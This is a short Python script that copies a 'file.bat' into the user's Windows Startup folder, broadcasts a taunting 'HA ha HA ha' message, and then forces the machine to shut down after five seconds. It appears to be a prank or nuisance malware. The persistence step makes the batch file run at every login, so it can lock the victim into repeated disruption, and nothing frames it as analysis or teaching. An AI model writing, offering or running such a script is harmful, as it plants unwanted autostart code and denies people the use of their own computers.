# Monday, ‎13 ‎April ‎2020
from os.path import expanduser
import os
import getpass
import shutil
home = expanduser("~")
s = getpass.getuser()
path = os. getcwd()
try:
    os.mkdir("C:/Users/" + s + '/AppData/Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
except:
    print("")

shutil.copy2(path + '/file.bat', home +
             '/AppData/Roaming\Microsoft\Windows\Start Menu\Programs\Startup/')
shutil.copy2(path + '/file.bat', 'C:/Users/' + s +
             '/AppData/Roaming\Microsoft\Windows\Start Menu\Programs\Startup/')
os.system("msg * HA ha HA ha !!!")
os.system("C:/windows/system32/shutdown.exe /s /f /t 5")
